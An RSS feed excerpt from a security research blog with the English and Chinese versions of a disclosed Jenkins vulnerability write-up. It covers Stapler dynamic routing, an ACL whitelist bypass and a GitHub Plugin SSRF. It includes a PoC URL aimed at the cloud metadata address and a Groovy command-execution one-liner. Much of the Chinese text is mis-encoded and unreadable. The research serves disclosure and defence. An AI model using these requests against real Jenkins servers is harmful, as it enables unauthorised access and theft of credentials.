  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It can extract any stored credentials with known credentials ID in Jenkins. But the credentials ID is a random UUID if there is no user-supplied value provided. So it seems impossible to exploit this?(Or if someone know how to obtain credentials ID, please tell me!)&lt;/p&gt;

&lt;p&gt;Although it canâ€™t extract any credentials without known credentials ID, there is still another attack primitive - a fully-response SSRF! We all know how hard it is to exploit a Blind SSRF, so thatâ€™s why a fully-responded SSRF is so valuable!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-pre-auth-remote-code-execution&quot;&gt;3. Pre-auth Remote Code Execution&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;PLEASE DONâ€™T BULLSHIT, WHERE IS THE RCE!!!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to maximize the impact, I also find an &lt;strong&gt;INTERESTING&lt;/strong&gt; remote code execution can be chained with this vulnerability to a well-deserved pre-auth RCE! But itâ€™s still on the responsible disclosure process. Please wait and see the Part 2! (Will be published on February 19th :P)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Here is my todo list which can make this vulnerability more perfect. If you find any of them please tell me, really appreciate it :P&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Get the &lt;code class=&quot;highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; object reference under &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. If this can be done, it can bypass the ACL restriction of &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; and &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; to a indeed pre-auth arbitrary file reading!&lt;/li&gt;
  &lt;li&gt;Find another gadget to invoke the method &lt;code class=&quot;highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. In order to fix &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins applies a &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;check&lt;/a&gt; on &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; to ensure the least privilege &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt;. So the original gadget will fail after Jenkins version 2.138.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Thanks Jenkins Security team especially Daniel Beck for the coordination and bug fixing! Here is the brief timeline:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - Report vulnerabilities to Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins patched the bug and assigned CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins patched the bug and assigned CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - Report Groovy vulnerability to Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins patched Groovy vulnerability and assigned CVE-2019-1003000, CVE-2019-1003001 and CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨è»Ÿé«”å·¥ç¨‹ä¸­, &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; åŠ &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; ä¸€ç›´éƒ½è¢«è­½ç‚ºæ˜¯è»Ÿé«”é–‹ç™¼ä¸Šçš„å¿…å‚™æµç¨‹, æœ‰å¤šå°‘å„ªé»å°±ä¸å¤šè«‡, å…‰æ˜¯å¹«åŠ©é–‹ç™¼è€…æ¸›å°‘è¨±å¤šé›œäº‹å°±æ˜¯å¾ˆå¤§çš„å„ªå‹¢äº†! è€Œåœ¨ CI/CD çš„é ˜åŸŸä¸­, Jenkins æ˜¯æœ€ç‚ºè€ç‰Œä¸”å»£ç‚ºäººçŸ¥çš„ä¸€å¥—å·¥å…·, ç”±æ–¼å®ƒçš„æ˜“ç”¨æ€§, å¼·å¤§çš„ Pipeline ç³»çµ±ä»¥åŠå°æ–¼å®¹å™¨å®Œç¾çš„æ•´åˆä½¿å¾— Jenkins ä¹Ÿæˆç‚ºç›®å‰æœ€å¤šäººä½¿ç”¨çš„ CI/CD æ‡‰ç”¨, æ ¹æ“š Snyk åœ¨ 2018 å¹´æ‰€åšå‡ºçš„ &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM ç”Ÿæ…‹å ±å‘Š&lt;/a&gt; ä¸­, Jenkins åœ¨ CI/CD æ‡‰ç”¨ä¸­ç´„ä½”å…­æˆçš„å¸‚ä½”ç‡!&lt;/p&gt;

&lt;p&gt;å°æ–¼ &lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;ç´…éšŠæ¼”ç·´(Red Team)&lt;/a&gt; ä¾†èªª, Jenkins æ›´æ˜¯å…µå®¶å¿…çˆ­ä¹‹åœ°, åªè¦èƒ½æŒæ¡ä¼æ¥­æš´éœ²åœ¨å¤–çš„ Jenkins å³å¯æŒæ¡å¤§é‡çš„åŸå§‹ç¢¼, ç™»å…¥æ†‘è­‰ç”šè‡³æ§åˆ¶å¤§é‡çš„ Jenkins ç¯€é»! åœ¨éå» DEVCORE æ‰€ç¶“æ‰‹éçš„æ»²é€æ¡ˆå­ä¸­ä¹Ÿå‡ºç¾éæ•¸æ¬¡ç”± Jenkins ç•¶æˆé€²å…¥é», ä¸€æ­¥ä¸€æ­¥å¾ä¸€å€‹å°è£‚ç¸«å°‡ç›®æ¨™æ’•é–‹åˆ°å®Œæ•´æ»²é€æ•´é–“å…¬å¸çš„ç¶“å…¸æ¡ˆä¾‹!&lt;/p&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« ä¸»è¦æ˜¯åˆ†äº«å»å¹´ä¸­é‡å° Jenkins æ‰€åšçš„ä¸€æ¬¡ç°¡å–® Security Review, éç¨‹ä¸­å…±ç™¼ç¾äº†äº”å€‹ CVE:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä¸­æ¯”è¼ƒè¢«å¤§å®¶æ‰€è¨è«–çš„æ‡‰è©²æ˜¯ CVE-2018-1999002, é€™æ˜¯ä¸€å€‹åœ¨ Windows ä¸‹çš„ä»»æ„æª”æ¡ˆè®€å–, ç”±æ–¼æ”»æ“Šæ–¹å¼ç¨å¾®æœ‰è¶£æ‰€ä»¥è¨è«–è²é‡è¼ƒé«˜ä¸€é», é€™å€‹å¼±é»åœ¨å¤–é‚Šä¹Ÿæœ‰äººåšäº†è©³ç´°çš„åˆ†æ, è©³æƒ…å¯ä»¥åƒè€ƒç”±é¨°è¨Šé›²é¼å¯¦é©—å®¤æ‰€åšçš„åˆ†æ(&lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;Jenkins ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ&lt;/a&gt;), ä»–å€‘ä¹ŸæˆåŠŸçš„å±•ç¤ºå¾ &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; æ‰¾åˆ°ä¸€å°æœªä¿®è£œçš„ Jenkins å¯¦ç¾ä»»æ„è®€æª”åˆ°é ç«¯ä»£ç¢¼åŸ·è¡Œå–å¾—æ¬Šé™çš„éç¨‹!&lt;/p&gt;

&lt;p&gt;ä½†é€™ç¯‡æ–‡ç« è¦æçš„ä¸¦ä¸æ˜¯é€™å€‹, è€Œæ˜¯ç•¶æ™‚ç‚ºäº†å˜—è©¦ç¹é CVE-2018-1999002 æ‰€éœ€çš„æœ€å°æ¬Šé™ Overall/Read æ™‚è·Ÿé€² Jenkins æ‰€ä½¿ç”¨çš„æ ¸å¿ƒæ¡†æ¶ Stapler æŒ–æ˜æ‰€ç™¼ç¾çš„å¦å¤–ä¸€å€‹å•é¡Œ - CVE-2018-1000861! å¦‚æœå…‰å¾å®˜æ–¹çš„æ¼æ´æ•˜è¿°æ‡‰è©²æœƒè¦ºå¾—å¾ˆç¥å¥‡, çœŸçš„å¯ä»¥å…‰å¾éš¨ä¾¿ä¸€å€‹ç¶²å€å»é”æˆä»£ç¢¼åŸ·è¡Œå—?&lt;/p&gt;

&lt;p&gt;é‡å°é€™å€‹æ¼æ´, æˆ‘çš„è§€é»æ˜¯å®ƒå°±æ˜¯ä¸€å€‹å­˜å–æ§åˆ¶æ¸…å–®(ACL)ä¸Šçš„ç¹é, ä½†ç”±æ–¼é€™æ˜¯ Jenkins æ¶æ§‹ä¸Šçš„å•é¡Œä¸¦ä¸æ˜¯å–®ä¸€çš„ç¨‹å¼ç·¨å¯«å¤±èª¤, é€²è€Œå°è‡´äº†é€™å€‹æ¼æ´åˆ©ç”¨ä¸Šçš„å¤šæ¨£æ€§! è€Œç‚ºäº†é€™å€‹æŠ€è¡“å‚µ, Jenkins å®˜æ–¹ä¹ŸèŠ±è²»äº†ä¸€ç•ªå¿ƒåŠ›(&lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins Patch&lt;/a&gt; åŠ &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler Patch&lt;/a&gt;)å»ä¿®å¾©é€™å€‹æ¼æ´, ä¸ä½†åœ¨åŸæœ‰çš„æ¶æ§‹ä¸Šä»‹ç´¹äº†æ–°çš„è·¯ç”±é»‘åå–®åŠç™½åå–®, ä¹Ÿæ“´å±•äº†åŸæœ‰æ¶æ§‹çš„ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; å»ä¿è­· Jenkins è·¯ç”±, ä¸‹é¢å°±ä¾†è§£é‡‹ç‚ºä½• Jenkins è¦èŠ±äº†é‚£éº¼å¤šå¿ƒåŠ›å»ä¿®å¾©é€™å€‹æ¼æ´!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ä»£ç¢¼å¯©æŸ¥ç¯„åœ&quot;&gt;ä»£ç¢¼å¯©æŸ¥ç¯„åœ&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;é¦–å…ˆè¦è²æ˜çš„æ˜¯, é€™ä¸¦ä¸æ˜¯ä¸€æ¬¡å®Œæ•´çš„ä»£ç¢¼å¯©æŸ¥(ç•¢ç«Ÿè¦åšä¸€æ¬¡å¤ªèŠ±æ™‚é–“äº†â€¦), å› æ­¤åªé‡å°é«˜é¢¨éšªæ¼æ´é€²è¡ŒæŒ–æ˜, è‘—çœ¼çš„ç¯„åœåŒ…æ‹¬:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins æ ¸å¿ƒ&lt;/li&gt;
  &lt;li&gt;Stapler ç¶²é æ¡†æ¶&lt;/li&gt;
  &lt;li&gt;å»ºè­°å®‰è£æ’ä»¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jenkins åœ¨å®‰è£éç¨‹ä¸­æœƒè©¢å•æ˜¯å¦å®‰è£å»ºè­°çš„å¥—ä»¶(åƒæ˜¯ Git, GitHub, SVN èˆ‡ Pipelineâ€¦ ç­‰ç­‰), åŸºæœ¬ä¸Šå¤§å¤šæ•¸äººéƒ½æœƒåŒæ„ä¸ç„¶å°±åªæœƒå¾—åˆ°ä¸€å€‹åŠæ®˜çš„ Jenkins å¾ˆä¸æ–¹ä¾¿XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;jenkins-ä¸­çš„æ¬Šé™æ©Ÿåˆ¶&quot;&gt;Jenkins ä¸­çš„æ¬Šé™æ©Ÿåˆ¶&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;å› ç‚ºé€™æ˜¯ä¸€å€‹åŸºæ–¼ ACL ä¸Šçš„ç¹é, æ‰€ä»¥åœ¨è§£é‡‹æ¼æ´ä¹‹å‰, å…ˆä¾†ä»‹ç´¹ä¸€ä¸‹ Jenkins ä¸­çš„æ¬Šé™æ©Ÿåˆ¶! åœ¨ Jenkins ä¸­æœ‰æ•¸ç¨®ä¸åŒçš„è§’è‰²æ¬Šé™, ç”šè‡³æœ‰å°ˆé–€çš„ &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt; (åŒç‚ºå»ºè­°å®‰è£å¥—ä»¶)å¯é‡å°å„å°ˆæ¡ˆé€²è¡Œç´°éƒ¨çš„æ¬Šé™è¨­å®š, å¾æ”»æ“Šè€…çš„è§’åº¦æˆ‘å€‘ç²—ç•¥åˆ†æˆä¸‰ç¨®:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;
&lt;p&gt;å°æ–¼ Jenkins æœ‰å®Œæ•´çš„æ§åˆ¶æ¬Š, å¯å° Jenkins åšä»»ä½•äº‹! åŸºæœ¬ä¸Šæœ‰é€™å€‹æ¬Šé™å³å¯é€é &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; ä»‹é¢ä½¿ç”¨ Groovy åŸ·è¡Œä»»æ„ä»£ç¢¼!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹æ¬Šé™å°æ–¼é§­å®¢ä¾†èªªä¹Ÿæ˜¯æœ€æ¸´æœ›å¾—åˆ°çš„æ¬Šé™, ä½†åŸºæœ¬ä¸Šç”±æ–¼å®‰å…¨æ„è­˜çš„æå‡åŠç¶²è·¯ä¸Šå„ç¨®æ®­å±ç¶²è·¯å°å…¨ç¶²é€²è¡Œæƒæ, é€™ç¨®é…ç½®å·²ç¶“å¾ˆå°‘è¦‹(æˆ–åªè¦‹æ–¼å…§ç¶²)&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;å¯å¾ &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; ä»‹é¢ä¸­å‹¾é¸ä¸‹é¢é¸é …ä¾†é–‹å•Ÿé€™å€‹æ¨¡å¼&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨é€™å€‹æ¨¡å¼ä¸‹, æ‰€æœ‰çš„å…§å®¹çš†æ˜¯å¯è®€çš„, ä¾‹å¦‚å¯çœ‹åˆ°å·¥ä½œæ—¥èªŒæˆ–æ˜¯ä¸€äº› job/node ç­‰æ•æ„Ÿè³‡è¨Š, å°æ–¼æ”»æ“Šè€…ä¾†èªªåœ¨é€™å€‹æ¨¡å¼ä¸‹æœ€å¤§çš„å¥½è™•å°±æ˜¯å¯ä»¥ç²å¾—å¤§é‡çš„åŸå§‹ç¢¼! ä½†èˆ‡ Full Access æ¨¡å¼æœ€å¤§çš„å·®ç•°å‰‡æ˜¯ç„¡æ³•é€²è¡Œæ›´é€²ä¸€æ­¥çš„æ“ä½œæˆ–æ˜¯åŸ·è¡Œ Groovy ä»£ç¢¼ä»¥å–å¾—æ§åˆ¶æ¬Š!&lt;/p&gt;

&lt;p&gt;é›–ç„¶é€™ä¸æ˜¯ Jenkins çš„é è¨­è¨­å®š, ä½†å°æ–¼ä¸€äº›ç¿’æ…£è‡ªå‹•åŒ–çš„ DevOps ä¾†èªªé‚„æ˜¯æœ‰å¯èƒ½é–‹å•Ÿé€™å€‹é¸é …, æ ¹æ“šå¯¦éš›åœ¨ &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; ä¸Šçš„èª¿æŸ¥ç´„ 12% çš„æ©Ÿå™¨é‚„æ˜¯é–‹å•Ÿé€™å€‹é¸é …! ä»¥ä¸‹ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; ä¾†ä»£ç¨±é€™å€‹æ¨¡å¼&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ Jenkins é è¨­å®‰è£å¥½çš„è¨­å®š, åœ¨æ²’æœ‰ä¸€çµ„æœ‰æ•ˆçš„å¸³è™Ÿå¯†ç¢¼ç‹€æ³ä¸‹ç„¡æ³•çœ‹åˆ°ä»»ä½•è³‡è¨ŠåŠé€²è¡Œä»»ä½•æ“ä½œ! ä»¥ä¸‹ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; ä¾†ä»£ç¨±æ­¤æ¨¡å¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;æ•´å€‹æ¼æ´è¦å¾ Jenkins çš„ &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;å‹•æ…‹è·¯ç”±&lt;/a&gt; è¬›èµ·, ç‚ºäº†çµ¦é–‹ç™¼è€…æ›´å¤§çš„å½ˆæ€§, Jenkins(åš´æ ¼ä¾†è¬›æ˜¯ Stapler)ä½¿ç”¨äº†ä¸€å¥— Naming Convention å»åŒ¹é…è·¯ç”±åŠå‹•æ…‹çš„åŸ·è¡Œ! é¦–å…ˆ Jenkins ä»¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; ç‚ºåˆ†éš”å°‡ URL ç¬¦è™ŸåŒ–, æ¥è‘—ç”± &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; ç‚ºå…¥å£é»é–‹å§‹å¾€ä¸‹æœå°‹, å¦‚æœç¬¦è™Ÿç¬¦åˆ (1) Public å±¬æ€§çš„æˆå“¡æˆ–æ˜¯ (2) Public å±¬æ€§çš„æ–¹æ³•ç¬¦åˆä¸‹åˆ—å‘½åè¦å‰‡, å‰‡èª¿ç”¨ä¸¦ç¹¼çºŒå¾€ä¸‹å‘¼å«:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, â€¦)&lt;/li&gt;
    &lt;li&gt;doDynamic(â€¦)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;çœ‹èµ·ä¾† Jenkins çµ¦äºˆé–‹ç™¼è€…å¾ˆå¤§ç¨‹åº¦çš„è‡ªç”±å»è¨ªå•å„å€‹ç‰©ä»¶, ä½†éæ–¼è‡ªç”±ç¸½æ˜¯ä¸å¥½çš„ï¼Œæ ¹æ“šé€™ç¨®èª¿ç”¨æ–¹å¼é€™è£¡å°±å‡ºç¾äº†å…©å€‹å•é¡Œ!&lt;/p&gt;

&lt;h3 id=&quot;1-è¬ç‰©çš†ç¹¼æ‰¿-javalangobject&quot;&gt;1. è¬ç‰©çš†ç¹¼æ‰¿ java.lang.Object&lt;/h3&gt;
&lt;p&gt;åœ¨ Java ä¸­, æ‰€æœ‰çš„ç‰©ä»¶çš†ç¹¼æ‰¿ &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt; é€™å€‹é¡åˆ¥, å› æ­¤æ‰€æœ‰åœ¨ Java ä¸­çš„ç‰©ä»¶çš†å­˜åœ¨è‘— &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; é€™å€‹æ–¹æ³•! è€Œæ°å·§é€™å€‹æ–¹æ³•åˆç¬¦åˆå‘½åè¦å‰‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;#1&lt;/code&gt;, å› æ­¤ &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; å¯åœ¨ Jenkins èª¿ç”¨éˆä¸­è¢«å‹•æ…‹å‘¼å«!&lt;/p&gt;

&lt;h3 id=&quot;2-è·¨ç‰©ä»¶æ“ä½œå°è‡´ç™½åå–®ç¹é&quot;&gt;2. è·¨ç‰©ä»¶æ“ä½œå°è‡´ç™½åå–®ç¹é&lt;/h3&gt;

&lt;p&gt;å‰é¢æ‰€æåˆ°çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ&lt;/code&gt;, å…¶ä¸­ &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; èˆ‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; é–“æœ€å¤§çš„ä¸åŒåœ¨æ–¼ç•¶åœ¨ç¦æ­¢çš„ç‹€æ³ä¸‹, æœ€åˆçš„å…¥å£é»æœƒé€é &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt; å¤šåšä¸€å€‹åŸºæ–¼ç™½åå–®çš„ URL å‰ç¶´æª¢æŸ¥, é€™å€‹ç™½åå–®å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
